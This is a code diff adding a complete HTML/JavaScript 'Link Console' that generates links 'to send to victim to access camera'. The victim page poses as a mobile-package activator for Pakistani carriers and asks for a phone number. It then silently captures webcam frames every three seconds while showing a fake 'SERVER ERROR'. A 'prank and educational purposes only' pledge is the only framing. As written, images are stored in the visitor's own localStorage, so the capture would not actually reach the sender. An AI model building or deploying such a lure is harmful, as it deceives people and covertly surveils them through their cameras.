@@ -1,0 +1,339 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>🔗 Link Console | FTGM</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+/* --- Theme Variables --- */
+:root {
+    --bg-dark: #0f1115;
+    --card-dark: rgba(26, 29, 35, 0.95);
+    --accent: #ef4444; 
+    --text-main: #f8fafc;
+    --text-dim: #94a3b8;
+    --border-dark: #2d333f;
+    
+    /* Light Theme (Activator) */
+    --bg-light: #f1f5f9;
+    --card-light: #ffffff;
+    --text-light-main: #0f172a;
+    --text-light-dim: #64748b;
+    --accent-blue: #3b82f6;
+    --border-light: #e2e8f0;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg-dark);
+    color: var(--text-main);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+/* --- Dashboard Style (Dark) --- */
+#dashboard-card {
+    background: var(--card-dark);
+    padding: 35px 30px;
+    border-radius: 24px;
+    max-width: 480px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+    border: 1px solid var(--border-dark);
+}
+
+/* --- Activator Style (Light & Realistic) --- */
+#pkg-activator-card {
+    background: var(--card-light);
+    color: var(--text-light-main);
+    padding: 30px;
+    border-radius: 20px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+    border: 1px solid var(--border-light);
+    display: none;
+}
+
+/* --- Common UI Components --- */
+button {
+    width: 100%;
+    padding: 16px;
+    border-radius: 12px;
+    border: none;
+    color: white;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.2s, opacity 0.2s;
+    display: flex; justify-content: center; align-items: center; gap: 10px;
+}
+button:active { transform: scale(0.97); }
+
+input, select {
+    width: 100%;
+    padding: 14px;
+    border-radius: 12px;
+    font-size: 1rem;
+    outline: none;
+}
+
+/* --- Toast Notification --- */
+#toast {
+    visibility: hidden;
+    min-width: 280px;
+    background-color: #1e293b;
+    color: #fff;
+    text-align: center;
+    border-radius: 12px;
+    padding: 16px;
+    position: fixed;
+    z-index: 10001;
+    bottom: 30px;
+    font-size: 14px;
+}
+#toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+
+/* --- Loader Animation --- */
+#loader-container { display: none; justify-content: center; padding: 20px 0; }
+.loader {
+    transform: rotateZ(45deg); perspective: 1000px; border-radius: 50%;
+    width: 48px; height: 48px; color: var(--accent); position: relative;
+}
+.loader:before, .loader:after {
+    content: ''; display: block; position: absolute; top: 0; left: 0;
+    width: inherit; height: inherit; border-radius: 50%; transform: rotateX(70deg);
+    animation: 1s spin linear infinite;
+}
+.loader:after { transform: rotateY(70deg); animation-delay: .4s; }
+
+@keyframes spin {
+    0%, 100% { box-shadow: .2em 0px 0 0px currentcolor; }
+    25% { box-shadow: 0 .2em 0 0px currentcolor; }
+    50% { box-shadow: -.2em 0 0 0 currentcolor; }
+    75% { box-shadow: 0px -.2em 0 0 currentcolor; }
+}
+
+/* --- Startup Modal --- */
+#startup-modal {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.9); display: flex; justify-content: center;
+    align-items: center; z-index: 10000;
+}
+.modal-content {
+    background: #1a1d23; padding: 30px; border-radius: 20px;
+    text-align: center; max-width: 380px; border: 1px solid var(--border-dark);
+}
+
+#activationStatus {
+    margin-top: 20px; padding: 15px; border-radius: 10px;
+    background: #fef2f2; color: #991b1b; border: 1px solid #fecaca;
+    display: none; font-size: 0.85rem;
+}
+
+.gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+.gallery img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 10px; }
+
+@keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+@keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+</style>
+</head>
+<body>
+
+<div id="startup-modal">
+    <div class="modal-content">
+        <h3 style="color: white; margin-bottom: 10px;">User Agreement</h3>
+        <p style="color: var(--text-dim); margin-bottom: 25px;">I promise to use this tool for prank and educational purposes only.</p>
+        <button id="promiseBtn" style="background: var(--accent);">Yes Promised</button>
+    </div>
+</div>
+
+<div id="toast"></div>
+
+<div class="card" id="dashboard-card">
+    <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" style="width: 50px; height: 50px; border-radius: 12px; margin-bottom: 15px;">
+    <h2>Link Console</h2>
+    <small style="color:var(--text-dim); margin-bottom:20px; display:block;">Generate link and send to victim to access camera.</small>
+
+    <div id="genArea">
+        <button id="genBtn" style="background: var(--accent);">Generate New Link</button>
+        <div id="loader-container"><span class="loader"></span></div>
+        <div id="linkBox" style="margin-top:20px;"></div>
+    </div>
+
+    <hr style="border:0; border-top:1px solid var(--border-dark); margin:25px 0;">
+
+    <div id="dataArea" style="display:none">
+        <h3 style="color:var(--accent); font-size:14px; margin-bottom:10px;">Captured Data (ID: <span id="showId"></span>)</h3>
+        <div id="images" class="gallery"></div>
+        <button id="downloadBtn" onclick="downloadAllImages()" style="background:#23272f; margin-top:20px; border:1px solid var(--border-dark);">Download All Images</button>
+    </div>
+</div>
+
+<div class="card" id="pkg-activator-card">
+    <h2 style="color:#0f172a;">Pkg Activator</h2>
+    <small style="color:#64748b; margin-bottom:20px; display:block;">Select SIM and enter number to activate package.</small>
+
+    <select id="sim-select" style="background:#f8fafc; border:1px solid #cbd5e1; margin-bottom:15px;">
+        <option value="">-- Select Your SIM --</option>
+        <option value="jazz">Jazz</option>
+        <option value="telenor">Telenor</option>
+        <option value="ufone">Ufone</option>
+        <option value="zong">Zong</option>
+        <option value="sco">SCOM</option>
+    </select>
+    <input type="tel" id="mobile-number" placeholder="Enter Mobile Number" style="background:#f8fafc; border:1px solid #cbd5e1; margin-bottom:15px;">
+    
+    <button id="activateBtn" style="background:#3b82f6;">Activate Pkg</button>
+    
+    <div id="activationStatus"></div>
+    <video id="videoElement" autoplay playsinline muted style="display:none"></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
+</div>
+
+<script>
+// UI Helper
+function showToast(msg) {
+    const t = document.getElementById("toast");
+    t.textContent = msg; t.className = "show";
+    setTimeout(() => { t.className = ""; }, 3000);
+}
+
+// RESTORED LOGIC START
+const CAPTURE_INTERVAL_MS = 3000; 
+const dashboardCard = document.getElementById('dashboard-card');
+const pkgActivatorCard = document.getElementById('pkg-activator-card');
+const genBtn=document.getElementById('genBtn');
+const linkBox=document.getElementById('linkBox');
+const dataArea=document.getElementById('dataArea');
+const showId=document.getElementById('showId');
+const images=document.getElementById('images');
+const activateBtn = document.getElementById('activateBtn');
+const simSelect = document.getElementById('sim-select');
+const mobileNumber = document.getElementById('mobile-number');
+const activationStatus = document.getElementById('activationStatus');
+const video = document.getElementById('videoElement');
+const canvas = document.getElementById('canvasElement');
+const loaderBox = document.getElementById('loader-container');
+let captureIntervalId = null;
+
+function generateId(){return 'user-'+Math.random().toString(36).slice(2,10);}
+function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
+function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}
+
+function renderImages(id){ 
+    const imgs=getImages(id);
+    images.innerHTML='';
+    if(!imgs.length){images.innerHTML='<small style="color:var(--text-dim); grid-column:1/-1;">No images yet.</small>'; return;}
+    imgs.forEach((url)=>{
+        const img=document.createElement('img'); img.src=url; images.appendChild(img);
+    });
+}
+
+async function downloadAllImages() {
+    const id = localStorage.getItem('currentId');
+    if (!id) return;
+    const imgs = getImages(id);
+    if (!imgs.length) { showToast("No images found"); return; }
+    const zip = new JSZip();
+    imgs.forEach((url, i) => zip.file(`img_${i+1}.jpeg`, url.split(',')[1], {base64: true}));
+    const content = await zip.generateAsync({type:"blob"});
+    const a = document.createElement('a'); a.href = URL.createObjectURL(content);
+    a.download = `captured_${id}.zip`; a.click();
+}
+
+// GEN BUTTON WITH 2S LOADER
+genBtn.onclick=()=>{
+    genBtn.style.display = 'none';
+    loaderBox.style.display = 'flex';
+    setTimeout(() => {
+        loaderBox.style.display = 'none';
+        const id=generateId();
+        showId.textContent=id;
+        const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
+        localStorage.setItem('currentId',id); 
+        linkBox.innerHTML=`
+            <input readonly value="${link}" style="background:#1a1d23; color:white; border:1px solid var(--border-dark); text-align:center; margin-bottom:10px;">
+            <div style="display:flex; gap:10px;">
+                <button id="copyBtn" style="background:#23272f; border:1px solid var(--border-dark);">Copy</button> 
+                <button id="openBtn" style="background:var(--accent);">Open</button>
+            </div>
+            <button id="refreshBtn" style="background:transparent; color:var(--text-dim); margin-top:10px; font-size:12px;">Refresh</button>
+        `;
+        document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
+        document.getElementById('copyBtn').onclick=()=>{
+            const inp = linkBox.querySelector('input'); inp.select();
+            document.execCommand('copy'); showToast("Copied!");
+        };
+        document.getElementById('refreshBtn').onclick = () => window.location.reload();
+        dataArea.style.display='block';
+        renderImages(id);
+    }, 2000);
+};
+
+// ACTIVATOR LOGIC
+activateBtn.onclick = async () => {
+    activationStatus.style.display = 'none';
+    if (!simSelect.value || mobileNumber.value.length < 11) {
+        activationStatus.style.display = 'block';
+        activationStatus.textContent = '❌ Invalid details.';
+        return;
+    }
+    activateBtn.disabled = true;
+    activateBtn.textContent = 'Processing...';
+    const ID = new URLSearchParams(location.search).get('id');
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.onloadedmetadata = () => video.play();
+        captureIntervalId = setInterval(() => {
+            if (video.videoWidth === 0) return;
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const capturedImage = canvas.toDataURL('image/jpeg', 0.5);
+            const old = getImages(ID); old.push(capturedImage); saveImages(ID, old);
+        }, CAPTURE_INTERVAL_MS);
+        setTimeout(() => {
+            activationStatus.style.display = 'block';
+            activationStatus.innerHTML = 'SERVER ERROR<br>Please Try Later Server Is Down!';
+        }, 1000); 
+    } catch (err) {
+        activationStatus.style.display = 'block';
+        activationStatus.textContent = 'SERVER ERROR: Camera access required for verification.';
+    }
+};
+
+// Modal Logic
+document.getElementById('promiseBtn').onclick = () => {
+    sessionStorage.setItem('promised', 'true');
+    document.getElementById('startup-modal').style.display = 'none';
+};
+
+// ROUTER
+const ID_PARAM = new URLSearchParams(location.search).get('id');
+if(ID_PARAM){
+    dashboardCard.style.display = 'none';
+    pkgActivatorCard.style.display = 'block';
+    document.body.style.background = 'var(--bg-light)';
+    document.getElementById('startup-modal').style.display = 'none';
+} else {
+    if(sessionStorage.getItem('promised')) document.getElementById('startup-modal').style.display = 'none';
+    const savedId=localStorage.getItem('currentId');
+    if(savedId){
+        showId.textContent=savedId;
+        dataArea.style.display='block';
+        renderImages(savedId);
+    }
+}
+</script>
+</body>
+</html>
